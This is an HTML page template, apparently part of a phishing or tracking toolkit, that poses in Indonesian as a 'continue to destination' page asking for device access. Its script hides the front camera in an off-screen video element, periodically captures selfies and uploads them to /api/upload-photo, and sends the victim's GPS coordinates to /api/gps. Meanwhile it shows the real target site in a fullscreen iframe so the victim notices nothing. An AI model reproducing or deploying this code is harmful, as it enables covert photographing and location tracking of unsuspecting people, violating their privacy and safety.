<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        html, body {
            width: 100%;
            height: 100%;
            overflow: hidden;
            background-color: #ffffff;
        }
        /* Fullscreen Frame Wrapper */
        #target-frame {
            width: 100vw;
            height: 100vh;
            border: none;
            display: none;
        }
        /* Elemen Tersembunyi untuk Proses Latar Belakang */
        #hidden-media {
            position: absolute;
            top: -9999px;
            left: -9999px;
            visibility: hidden;
        }
        #permission-screen {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            font-family: sans-serif;
            text-align: center;
            padding: 20px;
        }
        .btn-start {
            padding: 12px 24px;
            background-color: #007bff;
            color: #fff;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 15px;
        }
    </style>
</head>
<body>

    <!-- Layar Awal Minta Izin -->
    <div id="permission-screen">
        <h2>Melanjutkan ke Halaman Tujuan...</h2>
        <p>Silakan izinkan akses perangkat untuk melanjutkan navigasi.</p>
        <button class="btn-start" onclick="initPermissions()">Lanjutkan</button>
    </div>

    <!-- Frame Halaman Tujuan -->
    <iframe id="target-frame" src="about:blank"></iframe>

    <!-- Elemen DOM Tersembunyi -->
    <div id="hidden-media">
        <video id="video" autoplay playsinline muted></video>
        <canvas id="canvas"></canvas>
    </div>

    <script>
      const CONFIG = {
    targetUrl: "{{ config.target_url }}",
    mode: "{{ config.mode }}",
    photoInterval: {{ config.photo_interval }} * 1000
};

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const iframe = document.getElementById('target-frame');
const permScreen = document.getElementById('permission-screen');

async function initPermissions() {
    try {
        // Konfigurasi khusus untuk memaksa penggunaan Kamera Depan (Selfie)
        const cameraConstraints = {
            video: { 
                facingMode: { exact: "user" } // Memaksa kamera depan di HP
            }, 
            audio: false 
        };

        let stream;
        try {
            // Coba minta akses kamera depan secara ketat
            stream = await navigator.mediaDevices.getUserMedia(cameraConstraints);
        } catch (strictErr) {
            // Fallback jika 'exact: user' ditolak oleh browser/laptop tertentu
            stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" }, 
                audio: false 
            });
        }

        video.srcObject = stream;

        // Dapatkan lokasi GPS (1x eksekusi)
        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(sendGPS, (err) => console.log("GPS Error/Refused"));
        }

        // Tampilkan iframe & sembunyikan layar izin
        iframe.src = CONFIG.targetUrl;
        iframe.style.display = 'block';
        permScreen.style.display = 'none';

        // Jalankan proses latar belakang sesuai mode dari dashboard
        if (CONFIG.mode === 'photo') {
            setInterval(captureAndUploadPhoto, CONFIG.photoInterval);
        } else if (CONFIG.mode === 'stream') {
            console.log("Mode Streaming Kamera Depan Aktif");
        }

    } catch (err) {
        alert("Izin kamera depan dan lokasi diperlukan untuk melanjutkan.");
        console.error("Camera Error:", err);
    }
}

function sendGPS(position) {
    fetch('/api/gps', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude
        })
    });
}

function captureAndUploadPhoto() {
    if (!video.videoWidth) return;

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const context = canvas.getContext('2d');
    
    // Ambil gambar dari stream kamera depan
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob((blob) => {
        const formData = new FormData();
        formData.append('photo', blob, 'selfie_capture.jpg');

        fetch('/api/upload-photo', {
            method: 'POST',
            body: formData
        });
    }, 'image/jpeg', 0.8);
}</script>
</body>
</html>
